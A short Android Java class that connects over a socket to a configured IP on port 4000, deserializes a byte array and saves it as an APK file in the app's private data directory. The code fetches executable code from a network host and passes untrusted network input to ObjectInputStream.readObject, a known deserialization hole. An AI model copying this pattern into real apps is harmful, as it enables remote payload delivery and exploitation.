package com.so.and;


import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.net.Socket;

import android.annotation.SuppressLint;


@SuppressLint("SdCardPath")
public class recevoire_apk extends MainActivity {
	
	public static void lancer() {
		
     new Thread(new Runnable() {
   
    	private Socket s;

		@Override
    public void run() {
      try{
	s = new Socket(String_IP, 4000);

	ObjectInputStream ois = new ObjectInputStream(s.getInputStream());
	
	byte [] buffer = (byte[]) ois.readObject();
	FileOutputStream fos = new FileOutputStream("/data/data/com.so.and/app.apk");
	fos.write(buffer);
	fos.close();

	}catch (ClassNotFoundException e){
        e.printStackTrace();	
    } catch (IOException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	}
      }
}      	
         ).start();
    
   
  }

}